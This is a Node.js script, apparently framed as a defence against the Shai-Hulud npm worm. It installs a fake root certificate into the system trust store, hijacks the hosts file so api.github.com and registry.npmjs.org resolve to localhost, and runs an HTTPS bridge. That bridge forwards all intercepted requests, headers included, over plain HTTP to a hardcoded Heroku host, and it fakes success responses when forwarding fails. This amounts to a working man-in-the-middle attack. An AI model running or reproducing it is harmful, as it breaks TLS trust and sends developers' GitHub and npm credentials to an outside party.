// Prerequisites
// 1. Node.js must be installed on the victim machine.
// 2. The script must be run with Administrator/Root privileges (to update the Trust Store and Hosts file).
// 3. No npm install is required for the local machine (the script uses native Node.js modules).
// 4. You MUST update line 34!

// This version looks for fake-cert.pem and fake-key.pem in the current folder. If not found, it attempts to unzip ShaiHuludShield.zip.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn, execSync } = require('child_process');

// --- CONFIGURATION ---
const ZIP_NAME = 'ShaiHuludShield.zip';
const CERT_NAME = 'fake-cert.pem';
const KEY_NAME = 'fake-key.pem';
const BRIDGE_FILE = 'bridge.js';
const IP_REDIRECT = '127.0.0.1';
// This matches the domains the malware checks
const DOMAINS_TO_REDIRECT = ['api.github.com', 'registry.npmjs.org']; 

// --- PLATFORM DETECTION ---
const PLATFORM = os.platform(); 
const IS_WINDOWS = PLATFORM === 'win32';

// --- BRIDGE SCRIPT CONTENT (Provided by User) ---
const BRIDGE_SOURCE = `
const https = require('https');
const http = require('http');
const fs = require('fs');

// CONFIGURATION
const HEROKU_APP_URL = 'shai-hulud-2-0-dms-sh-bd640bc05c42.herokuapp.com'; // *** YOU MUST UPDATE THIS LINE ***
const LOCAL_IP = '127.0.0.1';

// SSL Options
const options = {
  key: fs.readFileSync('${KEY_NAME}'),
  cert: fs.readFileSync('${CERT_NAME}'),
};

const proxyHandler = (req, res) => {
    console.log(\`[BRIDGE] Intercepting request for: \${req.headers.host}\${req.url}\`);

    const options = {
        hostname: HEROKU_APP_URL,
        port: 80,
        path: req.url,
        method: req.method,
        headers: {
            ...req.headers,
            host: HEROKU_APP_URL
        }
    };

    const proxyReq = http.request(options, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res, { end: true });
    });

    proxyReq.on('error', (e) => {
        console.error(\`[ERROR] Bridge failed: \${e.message}\`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true })); 
    });

    req.pipe(proxyReq, { end: true });
};

https.createServer(options, proxyHandler).listen(443, LOCAL_IP, () => {
    console.log('--- BRIDGE ACTIVE ---');
    console.log(\`Redirecting captured traffic to \${HEROKU_APP_URL}\`);
});
`;

// --- STEP 1: LOCATE/EXTRACT CERTS ---
function prepareCerts() {
    console.log('[1/4] Checking for certificates...');
    
    if (fs.existsSync(CERT_NAME) && fs.existsSync(KEY_NAME)) {
        console.log('      Certificates found locally.');
        return;
    }

    if (fs.existsSync(ZIP_NAME)) {
        console.log('      Zip found. Extracting...');
        try {
            if (IS_WINDOWS) {
                execSync(`powershell -Command "Expand-Archive -Path ${ZIP_NAME} -DestinationPath . -Force"`);
            } else {
                // Linux/Mac usually have unzip
                execSync(`unzip -o ${ZIP_NAME}`);
            }
            
            // Handle MacOS zip artifacts if they exist
            if (fs.existsSync('__MACOSX')) {
                 // cleanup purely optional
            }
            
            console.log('      Extraction complete.');
        } catch (e) {
            console.error(`      [ERROR] Failed to unzip: ${e.message}`);
            process.exit(1);
        }
    } else {
        console.error('      [ERROR] No certificates (.pem) and no Zip file found.');
        process.exit(1);
    }
}

// --- STEP 2: TRUST THE CERTIFICATE ---
function trustCert() {
    console.log('[2/4] Adding Certificate to System Trust Store...');
    const certPath = path.resolve(CERT_NAME);

    try {
        if (PLATFORM === 'darwin') { // MacOS
            execSync(`sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain "${certPath}"`);
        } else if (PLATFORM === 'linux') { // Linux
            if (fs.existsSync('/usr/local/share/ca-certificates/')) {
                execSync(`sudo cp "${certPath}" /usr/local/share/ca-certificates/shai-hulud.crt`);
                execSync(`sudo update-ca-certificates`);
            } else if (fs.existsSync('/etc/pki/ca-trust/source/anchors/')) {
                execSync(`sudo cp "${certPath}" /etc/pki/ca-trust/source/anchors/shai-hulud.crt`);
                execSync(`sudo update-ca-trust`);
            }
        } else if (IS_WINDOWS) { // Windows
            execSync(`powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList 'Import-Certificate -FilePath ''${certPath}'' -CertStoreLocation Cert:\\LocalMachine\\Root'"` );
        }
        console.log('      Certificate trusted.');
    } catch (e) {
        console.error(`      [ERROR] Failed to trust certificate: ${e.message}`);
        console.log('      Run as Admin/Sudo.');
        process.exit(1);
    }
}

// --- STEP 3: UPDATE HOSTS FILE ---
function updateHosts() {
    console.log('[3/4] Hijacking DNS in Hosts file...');
    
    let hostsPath = IS_WINDOWS ? 'C:\\Windows\\System32\\drivers\\etc\\hosts' : '/etc/hosts';
    let entry = `\n# SHAI-HULUD DEFENSE\n`;
    DOMAINS_TO_REDIRECT.forEach(d => {
        entry += `${IP_REDIRECT} ${d}\n`;
    });

    try {
        const currentContent = fs.readFileSync(hostsPath, 'utf8');
        if (!currentContent.includes('SHAI-HULUD DEFENSE')) {
            fs.appendFileSync(hostsPath, entry);
            console.log('      Hosts file updated.');
        } else {
            console.log('      Hosts file already updated.');
        }
    } catch (e) {
        console.error(`      [ERROR] Cannot write to hosts: ${e.message}`);
        process.exit(1);
    }
}

// --- STEP 4: LAUNCH BRIDGE ---
function startBridge() {
    console.log('[4/4] STARTING BRIDGE SERVER...');
    
    // Write the bridge file dynamically
    fs.writeFileSync(BRIDGE_FILE, BRIDGE_SOURCE);

    const bridge = spawn('node', [BRIDGE_FILE], { stdio: 'inherit' });
    bridge.on('error', (err) => console.error(`Bridge Error: ${err.message}`));
}

// --- RUN ---
(function run() {
    prepareCerts();
    trustCert();
    updateHosts();
    startBridge();
})();
